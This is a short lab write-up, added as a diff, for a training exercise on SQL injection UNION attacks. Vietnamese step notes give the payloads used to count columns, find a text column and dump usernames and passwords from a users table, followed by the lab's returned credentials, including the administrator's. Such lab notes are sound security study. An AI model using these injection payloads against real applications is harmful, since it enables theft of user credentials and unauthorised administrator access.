@@ -1,0 +1,29 @@
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+Bước 1: xác định bảng có bao nhiêu cột
+Pets' UNION SELECT NULL,NULL--
+-> có 2 cột
+Bước 2: xác định cột nào có kiểu dữ liệu string
+Pets' UNION SELECT NULL,'asdf'--
+-> cột thứ 2 có kiểu dữ liệu string
+Bước 3: lấy dữ liệu từ bảng users
+username 
+password
+users
+->Pets'union select null,username || password from users-- 
+Pets'union select null,username || '-' || password from users--
+->
+Giant Grasshopper
+wiener2683sp8phgrb7n1pd4w1
+The Lazy Dog
+More Than Just Birdsong
+carloswphc19j1hzqf1ddi41ul
+administrator37urv8merdxcbql1fplo
+Babbage Web Spray
+->wiener-2683sp8phgrb7n1pd4w1
+carlos-wphc19j1hzqf1ddi41ul
+administrator-37urv8merdxcbql1fplo
